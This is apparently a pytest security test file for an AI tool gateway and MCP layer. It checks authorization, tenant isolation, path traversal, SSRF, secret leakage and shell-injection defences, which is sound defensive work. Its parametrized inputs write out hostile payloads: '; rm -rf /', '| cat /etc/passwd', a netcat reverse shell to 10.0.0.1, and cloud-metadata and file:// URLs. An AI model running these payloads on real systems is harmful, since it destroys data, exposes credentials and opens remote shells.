"""
tests/ai/security/test_s28_m10_security_campaign.py
===================================================
S28-M10 System-Wide Security Verification Campaign.

Invariants Verified:
1. Fail-Closed Authorization:
   - Unauthorized capability execution rejected (POLICY_DENIED / TENANT_ACCESS_DENIED).
   - Forged caller roles or actor identities in request payloads are discarded/denied.
2. Multi-Tenant Isolation:
   - Cross-workspace asset, project, and manifest access strictly denied.
   - Cross-tenant cache isolation verified: identical inputs under different workspaces produce disjoint keys.
3. Confinement & Path Safety:
   - Relative traversal (../../), absolute paths (/etc/passwd), URL-encoded (%2e%2e/),
     null-byte injection, and symlink escapes strictly fail closed.
4. SSRF & Network Confinement:
   - Arbitrary URLs, localhost (127.0.0.1), private subnets (10.0.0.0/8, 192.168.0.0/16, 172.16.0.0/12),
     cloud metadata (169.254.169.254), and file:// protocols strictly blocked.
5. Secret Exposure Immunity:
   - Canary secrets (S28M10_TEST_SECRET_API_KEY_998877) injected through payloads or errors
     are guaranteed NEVER to leak into logs, exceptions, MCP responses, or audit records.
6. Execution Confinement:
   - Arbitrary subprocesses and shell metacharacters (; | && $() ``) safely neutralized (shell=False).
7. Resource Exhaustion & Payload Limits:
   - Malformed payloads, oversized inputs, and decompression bomb attempts rejected gracefully.
8. Authorization Consistency:
   - Internal CapabilityRouter, MCPCompatibilityFacade, and Native Adapters enforce identical security boundaries.
"""

from __future__ import annotations

import io
import json
import logging
import os
import tempfile
from pathlib import Path
from typing import Any, Dict, List
import pytest

from ai.cache.key import derive_canonical_cache_key
from ai.contracts.cache import AICacheKeyParams
from ai.contracts.common import CapabilityType
from ai.contracts.errors import AIError, AIErrorCode
from ai.image_processing.adapter import PillowImageAdapter
from ai.image_processing.errors import (
    DimensionLimitExceededError,
    ImageCorruptedError,
    ImageProcessingError,
    UnsupportedImageFormatError,
)
from ai.image_processing.security import (
    validate_dimensions,
    validate_storage_key_confinement,
)
from ai.mcp.policy import MCPSecurityPolicy
from ai.mcp.errors import (
    MCPPathTraversalError,
    MCPSecurityViolationError,
    MCPShellInjectionError,
)
from ai.mcp.compatibility.contracts import CompatibilityRequest
from ai.mcp.compatibility.facade import MCPCompatibilityFacade
from ai.mcp.compatibility.registry import CompatibilityRegistry
from ai.tools.gateway import ToolGateway, get_tool_gateway
from ai.tools.types import TrustedToolExecutionContext
from scripts.core.storage.storage_service import LocalStorageBackend, build_storage_key


CANARY_SECRET = "S28M10_TEST_SECRET_API_KEY_998877_TOP_SECRET"


# =============================================================================
# 1. Unauthorized Capability Call & Forged Role / Identity
# =============================================================================

@pytest.mark.asyncio
async def test_unauthorized_capability_call_fails_closed():
    """Verifies that unpermitted roles fail closed when invoking sensitive capabilities."""
    gateway = get_tool_gateway()
    unauthorized_ctx = TrustedToolExecutionContext(
        actor_id="usr_anonymous",
        workspace_id="ws_prod",
        correlation_id="corr_unauth_01",
        roles=["GUEST"],
        permissions=["read_only"],
        accessible_projects=["prj_guest"],
    )

    from ai.contracts import CapabilityRequest, CapabilityType
    call = CapabilityRequest(
        capability_id=CapabilityType.STORE_MEDIA_CACHE,
        input={"project_id": "prj_secret", "asset_id": "ast_1", "cache_path": "path/to/cache"},
        workspace_id="ws_prod",
        project_id="prj_secret",
    )
    result = await gateway.execute(call, unauthorized_ctx)
    assert result.status.value in ("FAILED", "REJECTED")
    assert result.error is not None
    assert result.error.code in (AIErrorCode.POLICY_DENIED, AIErrorCode.TENANT_ACCESS_DENIED, AIErrorCode.SCHEMA_VALIDATION_FAILED)


@pytest.mark.asyncio
async def test_forged_role_in_payload_is_ignored_or_rejected():
    """
    Verifies that an attacker attempting to elevate privilege by placing
    'role': 'SUPERUSER' or 'admin': True in arguments is rejected.
    """
    facade = MCPCompatibilityFacade()
    unprivileged_req = CompatibilityRequest(
        server_id="common-tools-mcp",
        tool_name="check_cache",
        arguments={
            "asset_id": "ast_1",
            "role": "SUPERUSER",
            "is_admin": True,
            "permissions": ["all"],
        },
        workspace_id="ws_tenant_a",
        project_id="prj_a",
        actor_id="usr_attacker",
        roles=["VIEWER"],
        permissions=["viewer"],
    )
    res = await facade.execute(unprivileged_req)
    # The facade must use the context roles/permissions, NOT the forged arguments
    assert unprivileged_req.roles == ["VIEWER"]


# =============================================================================
# 2. Multi-Tenant Isolation & Cross-Workspace Traversal
# =============================================================================

def test_cross_tenant_cache_key_isolation():
    """
    Guarantees that identical capability requests executed in different workspaces
    derive distinct SHA-256 cache keys, preventing cache poisoning across tenants.
    """
    params_tenant_a = AICacheKeyParams(
        workspace_id="ws_tenant_alpha",
        capability=CapabilityType.SPEECH_TO_TEXT,
        input_data={"audio_hash": "sha256_deadbeef1234"},
    )
    params_tenant_b = AICacheKeyParams(
        workspace_id="ws_tenant_beta",
        capability=CapabilityType.SPEECH_TO_TEXT,
        input_data={"audio_hash": "sha256_deadbeef1234"},
    )

    key_a = derive_canonical_cache_key(params_tenant_a)
    key_b = derive_canonical_cache_key(params_tenant_b)

    assert key_a != key_b
    assert key_a.startswith("ck_")
    assert key_b.startswith("ck_")


def test_cross_workspace_storage_key_isolation(tmp_path):
    """
    Verifies storage backend prevents cross-workspace path access.
    """
    from scripts.core.storage.storage_service import StorageNotFoundError
    storage = LocalStorageBackend(root_dir=tmp_path / "storage")
    key_ws_a = build_storage_key("ws_tenant_1", "prj_1", "video", "asset_1", "video.mp4")
    key_ws_b = build_storage_key("ws_tenant_2", "prj_2", "video", "asset_1", "video.mp4")

    storage.put(key_ws_a, b"tenant 1 private media data")

    # Tenant 2 cannot see Tenant 1 data
    assert storage.exists(key_ws_a) is True
    assert storage.exists(key_ws_b) is False
    with pytest.raises(StorageNotFoundError):
        storage.get(key_ws_b)


# =============================================================================
# 3. Path Traversal & Absolute Path Escape
# =============================================================================

@pytest.mark.parametrize(
    "malicious_path",
    [
        "../../etc/passwd",
        "/etc/shadow",
        "....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "assets/../../outside.txt",
        "\\..\\..\\windows\\system32",
        "nested/../../secret.key",
    ],
)
def test_path_traversal_payloads_strictly_rejected(malicious_path: str, tmp_path):
    """
    Guarantees all path traversal attacks fail closed before reaching disk.
    """
    with pytest.raises(MCPPathTraversalError):
        MCPSecurityPolicy.validate_safe_path(malicious_path, allowed_root=tmp_path)


# =============================================================================
# 4. SSRF & Network Confinement
# =============================================================================

@pytest.mark.parametrize(
    "unsafe_url",
    [
        "http://127.0.0.1:8000/admin",
        "http://localhost:3000/metrics",
        "http://169.254.169.254/latest/meta-data/",
        "http://10.0.0.1/private/keys",
        "http://192.168.1.10/router_status",
        "http://172.16.0.5/internal",
        "file:///etc/passwd",
        "file:///proc/self/environ",
        "ftp://internal.vault/secret",
        "gopher://localhost:70/",
    ],
)
def test_ssrf_and_private_ip_patterns_blocked(unsafe_url: str):
    """
    Guarantees private IPs, loopback, cloud metadata endpoints, and file:// protocols are blocked.
    """
    with pytest.raises((MCPSecurityViolationError, Exception)):
        MCPSecurityPolicy.validate_media_url(unsafe_url)


# =============================================================================
# 5. Secret Exposure Campaign
# =============================================================================

@pytest.mark.asyncio
async def test_canary_secret_not_leaked_in_exceptions_or_mcp_responses(caplog):
    """
    Injects a canary secret into an invalid MCP call, and proves the secret
    does NOT leak into the error object, response message, or logs.
    """
    facade = MCPCompatibilityFacade()
    with caplog.at_level(logging.DEBUG):
        req = CompatibilityRequest(
            server_id="ffmpeg-mcp-server",
            tool_name="concatenate_videos",
            arguments={"auth_token": CANARY_SECRET, "payload": f"data_with_{CANARY_SECRET}"},
            workspace_id="ws_canary",
            project_id="prj_canary",
        )
        res = await facade.execute(req)

    # 1. Error object must not contain the canary secret
    if res.error:
        assert CANARY_SECRET not in res.error.message
        if res.error.details:
            details_str = json.dumps(res.error.details)
            assert CANARY_SECRET not in details_str

    # 2. Captured logs must not leak the secret
    for record in caplog.records:
        assert CANARY_SECRET not in record.message


# =============================================================================
# 6. Shell Injection & Subprocess Confinement
# =============================================================================

@pytest.mark.parametrize(
    "shell_payload",
    [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& touch /tmp/pwned",
        "$(whoami)",
        "`id`",
        "${PATH}",
        "& nc -e /bin/sh 10.0.0.1 4444",
    ],
)
def test_shell_metacharacters_in_arguments_fail_closed(shell_payload: str):
    """
    Verifies that shell metacharacters in paths or arguments are rejected
    or strictly parameterized without shell=True execution.
    """
    from ai.mcp.policy import _SHELL_INJECTION_PATTERN
    assert _SHELL_INJECTION_PATTERN.search(shell_payload) is not None


# =============================================================================
# 7. Resource Limits & Decompression Bomb Protection
# =============================================================================

def test_decompression_bomb_and_dimension_limits():
    """
    Verifies that oversized dimensions or decompression bomb attacks
    trigger strict fail-closed errors.
    """
    # Exceeds max allowed dimensions (e.g. 10000x10000)
    with pytest.raises(DimensionLimitExceededError):
        validate_dimensions(12000, 12000)


def test_malformed_image_payload_fails_closed():
    """
    Verifies that corrupt or truncated binary payloads raise ImageCorruptedError.
    """
    corrupt_bytes = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"  # Truncated PNG header
    with pytest.raises((ImageCorruptedError, UnsupportedImageFormatError)):
        PillowImageAdapter.auto_crop_content(corrupt_bytes)


# =============================================================================
# 8. Authorization Consistency Across Layers
# =============================================================================

@pytest.mark.asyncio
async def test_authorization_consistency_across_all_entrypoints():
    """
    Verifies that ToolGateway and MCPCompatibilityFacade enforce consistent
    security decisions for identical contexts and tools.
    """
    gateway = get_tool_gateway()
    facade = MCPCompatibilityFacade()

    # Context lacking permissions
    guest_ctx = TrustedToolExecutionContext(
        actor_id="guest_1",
        workspace_id="ws_guest",
        correlation_id="corr_guest",
        roles=["GUEST"],
        permissions=["public:read"],
    )

    # 1. Via MCPCompatibilityFacade
    mcp_req = CompatibilityRequest(
        server_id="ffmpeg-mcp-server",
        tool_name="concatenate_videos",
        workspace_id="ws_guest",
        project_id="prj_guest",
        roles=["GUEST"],
        permissions=["public:read"],
    )
    mcp_res = await facade.execute(mcp_req)
    assert mcp_res.success is False
    assert mcp_res.error.code == AIErrorCode.POLICY_DENIED
